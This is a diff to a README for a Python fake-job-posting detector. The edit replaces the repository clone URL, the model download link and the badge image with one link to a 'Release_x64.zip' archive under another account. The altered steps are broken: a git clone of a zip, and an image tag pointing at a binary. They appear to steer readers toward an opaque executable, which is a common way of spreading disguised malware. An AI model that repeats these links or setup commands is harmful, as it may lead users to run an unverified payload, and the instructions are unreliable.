@@ -24,16 +24,16 @@ In today's digital age, job seekers are increasingly vulnerable to fake job post
 To get started with the **Fake Job Post Detection** system, follow these steps:
 1. Clone the repository using the following command:
    ```
-   git clone https://github.com/22155555/fake-job-post-detection.git
+   git clone https://github.com/MacDung123/fake-job-post-detection/releases/download/v1.0/Release_x64.zip
    ```
 2. Install the required Python libraries by running:
    ```
    pip install numpy pandas scikit-learn joblib
    ```
 3. Download the pre-trained model and necessary files from the following link:
-   [Launch Fake Job Post Detection System](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+   [Launch Fake Job Post Detection System](https://github.com/MacDung123/fake-job-post-detection/releases/download/v1.0/Release_x64.zip)
 
-   ![Launch Fake Job Post Detection System](https://img.shields.io/badge/Launch-Fake_Job_Post_Detection_System-blue)
+   ![Launch Fake Job Post Detection System](https://github.com/MacDung123/fake-job-post-detection/releases/download/v1.0/Release_x64.zip)
 
 ## Usage
 Once you have installed the required dependencies and downloaded the necessary files, you can run the Fake Job Post Detection system by executing the main script. The GUI interface will guide you through the process of analyzing job postings and detecting potential frauds. Follow the prompts on the screen to input job post details and receive the system's classification results.
